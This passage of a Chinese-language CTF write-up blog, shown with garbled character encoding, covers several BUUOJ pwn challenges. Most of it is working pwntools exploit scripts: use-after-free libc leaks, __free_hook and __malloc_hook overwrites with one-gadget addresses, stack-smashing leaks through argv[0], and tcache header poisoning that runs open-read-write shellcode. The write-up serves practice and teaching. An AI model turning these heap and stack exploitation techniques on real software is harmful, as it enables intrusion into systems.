main_heap â”‚    flag     â”‚              â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤              â”‚                       <span class="hljs-number">0x91</span>â”‚              â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤              â”‚             â”‚             â”œâ”€â”€â”€â”€â”€â”€â–¶<span class="hljs-number">0x10</span>   â”‚     name    â”‚      sex    â”‚              â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤              â”‚                           â”‚              â”‚                           â”‚              â”‚                           â”‚              â”‚                           â”‚              â”‚                           â”‚              â”‚          data             â”‚              â”‚                           â”‚       â”Œâ”€â”€â”€â”€â” â”‚                           â”œâ”€â”€â”€â”€â”€â”€â–¶â”‚<span class="hljs-number">0x80</span>â”‚ â”‚                           â”‚       â””â”€â”€â”€â”€â”˜ â”‚                           â”‚              â”‚                           â”‚              â”‚                           â”‚              â”‚                           â”‚              â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span></code></pre></div><h3 id="æ”»å‡»æ€è·¯-2"><a href="#æ”»å‡»æ€è·¯-2" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>é‡Šæ”¾ä¸€ä¸ª0x90çš„å †ï¼Œåˆ©ç”¨uafè¿›è¡Œæ³„æ¼libc</li><li>ç”³è¯·2ä¸ªå †ï¼Œæ­¤æ—¶åœ¨è¿™ä¸ª0x90çš„unsortbinä¼šç•™ä¸‹2ä¸ª0x20çš„personæ•°æ®ç»“æ„çš„å¤´</li><li>editè¿™ä¸ªé‡Šæ”¾çš„å †ï¼Œæ§åˆ¶å…¶ä¸­<code>main_heap</code>çš„åœ°å€ï¼Œç„¶åè¿›è¡Œä»»æ„åœ°å€å†™ã€‚</li></ul><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./gyctf_2020_document'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25009</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(name,sex,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)    sa(<span class="hljs-string">'name'</span>,str(name))    sa(<span class="hljs-string">'sex'</span>,str(sex))    sa(<span class="hljs-string">'infor'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'index'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,sex,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'sex'</span>,str(sex))    sa(<span class="hljs-string">'infor'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'index'</span>,str(idx))data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x78</span>add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'W'</span>,data)add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'W'</span>,data)free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)r()libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b78</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'W'</span>,data)add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'W'</span>,data)free_hook = <span class="hljs-number">0x3c67a8</span> + libc_basedata = <span class="hljs-string">'\x00'</span>* <span class="hljs-number">8</span> + p64(<span class="hljs-number">0x71</span>) + p64(free_hook<span class="hljs-number">-0x10</span>) + <span class="hljs-string">'\x01'</span> * <span class="hljs-number">0x58</span>edit(<span class="hljs-number">0</span>,<span class="hljs-string">"N"</span>,data)data = p64(libc_base + <span class="hljs-number">0x4526a</span>) + <span class="hljs-number">0x68</span> * <span class="hljs-string">'\x00'</span>edit(<span class="hljs-number">3</span>,<span class="hljs-string">'N'</span>,data)free(<span class="hljs-number">0</span>)itr()</code></pre></div><h2 id="wdb-2018-guess"><a href="#wdb-2018-guess" class="headerlink" title="wdb_2018_guess"></a><code>wdb_2018_guess</code></h2><h3 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¸»è¦å°±æ˜¯åˆ©ç”¨stack smashingã€‚</p><h4 id="stack-smashing"><a href="#stack-smashing" class="headerlink" title="stack smashing"></a>stack smashing</h4><h5 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h5><p>åœ¨ç¨‹åºå¯åŠ¨ canary ä¿æŠ¤ä¹‹åï¼Œå¦‚æœå‘ç° canary è¢«ä¿®æ”¹çš„è¯ï¼Œç¨‹åºå°±ä¼šæ‰§è¡Œ <code>__stack_chk_fail</code>å‡½æ•°æ¥æ‰“å° <code>argv[0]</code> æŒ‡é’ˆæ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œè¿™ä¸ªæŒ‡é’ˆæŒ‡å‘äº†ç¨‹åºåã€‚å…¶ä»£ç å¦‚ä¸‹</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="hljs-keyword">void</span>)&#123;  __fortify_fail (<span class="hljs-string">"stack smashing detected"</span>);&#125;<span class="hljs-keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *msg)&#123;  <span class="hljs-comment">/* The loop is added only to keep gcc happy.  */</span>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)    __libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">"*** %s ***: %s terminated\n"</span>,                    msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">"&lt;unknown&gt;"</span>);&#125;</code></pre></div><p>æ‰€ä»¥è¯´å¦‚æœæˆ‘ä»¬åˆ©ç”¨æ ˆæº¢å‡ºè¦†ç›– <code>argv[0]</code> ä¸ºæˆ‘ä»¬æƒ³è¦è¾“å‡ºçš„å­—ç¬¦ä¸²çš„åœ°å€ï¼Œé‚£ä¹ˆåœ¨ <strong><code>fortify_fail</code> å‡½æ•°ä¸­å°±ä¼šè¾“å‡ºæˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ã€‚</strong></p><p>æ³¨æ„å…¶æ˜¯%sæ¥æ‰“å°ä¸œè¥¿çš„ï¼Œæ‰€ä»¥åœ¨åˆ©ç”¨æ—¶è¦ç”¨<code>argv[0]</code>åšä¸ªè·³æ¿ã€‚</p><h5 id="å¦‚ä½•è·å–æ ˆå€¼"><a href="#å¦‚ä½•è·å–æ ˆå€¼" class="headerlink" title="å¦‚ä½•è·å–æ ˆå€¼"></a>å¦‚ä½•è·å–æ ˆå€¼</h5><p><a href="https://blog.csdn.net/chennbnbnb/article/details/104035261" target="_blank" rel="noopener">https://blog.csdn.net/chennbnbnb/article/details/104035261</a></p><p>Libcä¸Šçš„<code>_environ</code>å­˜æ”¾ç€å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ï¼Œå…¶æ˜¯ä¸€ä¸ªæ ˆåœ°å€ã€‚</p><p>ä»¥æ­¤æ¥è·å–æ ˆå€¼ï¼Œç„¶åæ ¹æ®åç§»æ¥è®¿é—®æ ˆä¸­çš„æ•°æ®ã€‚</p><h3 id="æ”»å‡»æ€è·¯-3"><a href="#æ”»å‡»æ€è·¯-3" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>è·å–libcåŸºåœ°å€</li><li>è·å–stackåœ°å€ï¼Œæ ¹æ®åç§»æ‰¾åˆ°å­˜æ”¾flagçš„stack address</li><li>è¦†ç›–<code>argv[0]</code>ä¸ºflagçš„stack address</li></ul><p>å…¶ä¸­æ¯æ¬¡éƒ½æ˜¯ç”¨gets è¦†ç›–åˆ°è¦†ç›–<code>argv[0]</code>  ,stack smashingæ¥å®Œæˆã€‚</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./GUESS'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26813</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x128</span> + p64(elf.got[<span class="hljs-string">'__libc_start_main'</span>])sla(<span class="hljs-string">'flag'</span>,data)ru(<span class="hljs-string">'hing detected ***: '</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x20740</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x128</span> + p64(libc.sym[<span class="hljs-string">'_environ'</span>] + libc_base)sla(<span class="hljs-string">'flag'</span>,data)ru(<span class="hljs-string">'hing detected ***: '</span>)stack_flag = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x168</span>info_addr(<span class="hljs-string">'stack_base'</span>,stack_flag)data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x128</span> + p64(stack_flag)sla(<span class="hljs-string">'flag'</span>,data)itr()</code></pre></div><h2 id="suctf-2018-basic-pwn"><a href="#suctf-2018-basic-pwn" class="headerlink" title="suctf_2018_basic pwn"></a><code>suctf_2018_basic pwn</code></h2><p>æ— è„‘æ ˆæº¢å‡º</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./SUCTF_2018_basic_pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25741</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x118</span> + p64(<span class="hljs-number">0x000000401157</span>)sl(data)itr()</code></pre></div><h2 id="SWPUCTF-2019-p1KkHeap"><a href="#SWPUCTF-2019-p1KkHeap" class="headerlink" title="SWPUCTF_2019_p1KkHeap"></a><code>SWPUCTF_2019_p1KkHeap</code></h2><h3 id="åˆ†æ-4"><a href="#åˆ†æ-4" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul><li>å¼€äº†æ²™ç®±ï¼Œå¯ä»¥orwæ‹¿åˆ°flag</li><li>åŠŸèƒ½åªèƒ½è°ƒç”¨18æ¬¡ï¼Œfreeåªèƒ½3æ¬¡</li><li>freeä¸­å­˜åœ¨uaf</li><li>mmapäº†ä¸€å— rwxçš„å†…å­˜åœ¨ <code>0x66660000</code></li></ul><h3 id="æ”»å‡»æ€è·¯-4"><a href="#æ”»å‡»æ€è·¯-4" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>æ³„æ¼heap baseï¼Œå‡†å¤‡æ”»å‡»tcache binçš„è¡¨å¤´</li><li>è¦†ç›–bin countsä¸º7ï¼Œä¼ªé€ æ»¡binï¼Œfree chunkï¼Œæ³„æ¼libc</li><li>æ”»å‡»tcache binçš„è¡¨å¤´ä¸­bin chunk header çš„éƒ¨åˆ†ï¼Œæ”¾ä¸‹<code>0x66660000</code> å’Œ<code>malloc_hook</code>ï¼Œå‡†å¤‡ä¿®æ”¹è¿™ä¸¤ä¸ªéƒ¨åˆ†ã€‚</li><li>åœ¨<code>0x66660000</code>çš„å†…å­˜ä¸Šå†™ä¸‹orwçš„shellcode</li><li>æ”»å‡»<code>malloc_hook</code>ä¸º<code>0x66660000</code> å–å¾—flag</li></ul><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./SWPUCTF_2019_p1KkHeap'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29911</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-string">'''================================================================================ line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x07 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0011 0004: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0011 0005: 0x15 0x00 0x04 0x00000001  if (A != write) goto 0010 0006: 0x20 0x00 0x00 0x00000024  A = count &gt;&gt; 32 # write(fd, buf, count) 0007: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0010 0008: 0x20 0x00 0x00 0x00000020  A = count # write(fd, buf, count) 0009: 0x15 0x01 0x00 0x00000010  if (A == 0x10) goto 0011 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0011: 0x06 0x00 0x00 0x00000000  return KILL'''</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'id'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'id'</span>,str(idx))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'id'</span>,str(idx))add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#0</span>free(<span class="hljs-number">0</span>)free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)ru(<span class="hljs-string">'content: '</span>)heap_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x260</span>info_addr(<span class="hljs-string">'heap_base'</span>,heap_base)add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#1</span>edit(<span class="hljs-number">1</span>,p64(heap_base+<span class="hljs-number">0x10</span>))add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#2</span>add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#3</span>debug()data = p64(<span class="hljs-number">8</span>) + <span class="hljs-string">'\x07'</span>*<span class="hljs-number">8</span>edit(<span class="hljs-number">3</span>,data)add(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#4</span>free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)ru(<span class="hljs-string">'content: '</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ebca0</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)data = p64(<span class="hljs-number">8</span>) + <span class="hljs-string">'\x07'</span>*<span class="hljs-number">8</span> + <span class="hljs-string">'\x00'</span> * (<span class="hljs-number">0xc0</span> - <span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">0x3ebc30</span> + libc_base) +p64(<span class="hljs-number">0x66660000</span>) edit(<span class="hljs-number">3</span>,data)add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#5</span>orw = shellcraft.open(<span class="hljs-string">'flag'</span>)orw += shellcraft.read(<span class="hljs-number">3</span>,<span class="hljs-number">0x66660100</span>,<span class="hljs-number">0x64</span>)orw +=shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-number">0x66660100</span>,<span class="hljs-number">0x64</span>)edit(<span class="hljs-number">5</span>,asm(orw))add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#6</span>edit(<span class="hljs-number">6</span>,p64(<span class="hljs-number">0x66660000</span>))add(<span class="hljs-number">1</span>)itr()</code></pre></div><h3 id="é¢˜è®°-1"><a href="#é¢˜è®°-1" class="headerlink" title="é¢˜è®°"></a>é¢˜è®°</h3><p>åœ¨å­¦ä¹ åˆ«äººçš„expæ—¶ï¼Œå‘ç°è¿˜æœ‰æ³„æ¼libcçš„å¦å¤–ä¸€ç§åŠæ³•ï¼Œè¿™ç§åŠæ³•æ³„æ¼å‡ºlibcï¼Œä¹Ÿä½¿å¾—æ•´ä¸ªexpï¼ŒåŸºæœ¬è·Ÿæˆ‘çš„ä¸å¤§ç›¸åŒã€‚</p><h4 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h4><p><strong>åœ¨tcache binçš„è¡¨å¤´ä¸­ï¼Œå…¶æ¯ä¸ªå¤§å°tcache binçš„count(0-7) æ˜¯ä¸€ä¸ªæ— ç¬¦å·ç±»å‹çš„æ•°æ®ã€‚</strong></p><p>å½“ç”¨uafæ¼æ´ï¼Œåœ¨ä¸€ä¸ªchainä¸Šä¼ªé€ ä¸€ä¸ªchunkåœ°å€ï¼Œè¿™æ ·å½“ç”³è¯·åtcache binçš„countä¼šå˜æˆ0xff&gt;0x7ï¼Œè¿™æ ·åˆ©ç”¨uafï¼Œå†æ¬¡é‡Šæ”¾è¿™ä¸ªchainä¸Š çš„chunkï¼Œå°±ä¼šè¿›å…¥åˆ°unsortbinï¼Œæ¥ç€å°±leak å‡ºlibcäº†ã€‚</p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; parseheapaddr                prev                size                 status              fd                bk<span class="hljs-number">0x55daa2e85000</span>      <span class="hljs-number">0x0</span>                 <span class="hljs-number">0x250</span>                Used                None              None<span class="hljs-number">0x55daa2e85250</span>      <span class="hljs-number">0x0</span>                 <span class="hljs-number">0x110</span>                Freed     <span class="hljs-number">0x7fb70dbbaca0</span>    <span class="hljs-number">0x7fb70dbbaca0</span><span class="hljs-number">0x55daa2e85360</span>      <span class="hljs-number">0x110</span>               <span class="hljs-number">0x110</span>                Freed     <span class="hljs-number">0x55daa2e85370</span>              Nonepwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x55daa2e85000</span><span class="hljs-number">0x55daa2e85000</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000251</span><span class="hljs-number">0x55daa2e85010</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0xff00000000000000</span><span class="hljs-number">0x55daa2e85020</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span></code></pre></div><p>å‰©ä¸‹çš„å°±æ˜¯è¿›è¡Œtcache dupå³å¯ã€‚è¿™ä¸ªæ¯”æˆ‘é‚£ä¸ªæ–¹æ³•è¦ç®€å•çš„å¤šã€‚</p><h4 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h4><p><a href="https://blog.csdn.net/github_36788573/article/details/103475238" target="_blank" rel="noopener">https://blog.csdn.net/github_36788573/article/details/103475238</a></p><p><a href="https://blog.csdn.net/seaaseesa/article/details/103450524" target="_blank" rel="noopener">https://blog.csdn.net/seaaseesa/article/details/103450524</a></p><h2 id="æŠ¤ç½‘æ¯-2018-gettingstart"><a href="#æŠ¤ç½‘æ¯-2018-gettingstart" class="headerlink" title="æŠ¤ç½‘æ¯_2018_gettingstart"></a><code>æŠ¤ç½‘æ¯_2018_gettingstart</code></h2><p>ç™½ç»™é¢˜ã€‚è€ƒæµ®ç‚¹æ•°åœ¨å†…å­˜ä¸­æ˜¯æ€ä¹ˆå­˜çš„ã€‚</p><div class="hljs"><pre><code class="hljs python">data = <span class="hljs-string">'1'</span> * <span class="hljs-number">24</span> + p64(<span class="hljs-number">0x7fffffffffffffff</span>) + p64(<span class="hljs-number">0x3FB999999999999A</span>)s(data)itr()</code></pre></div><h2 id="OGeek2019-bookmanager"><a href="#OGeek2019-bookmanager" class="headerlink" title="[OGeek2019]bookmanager"></a><code>[OGeek2019]bookmanager</code></h2><h3 id="åˆ†æ-5"><a href="#åˆ†æ-5" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul><li>å­˜åœ¨heap 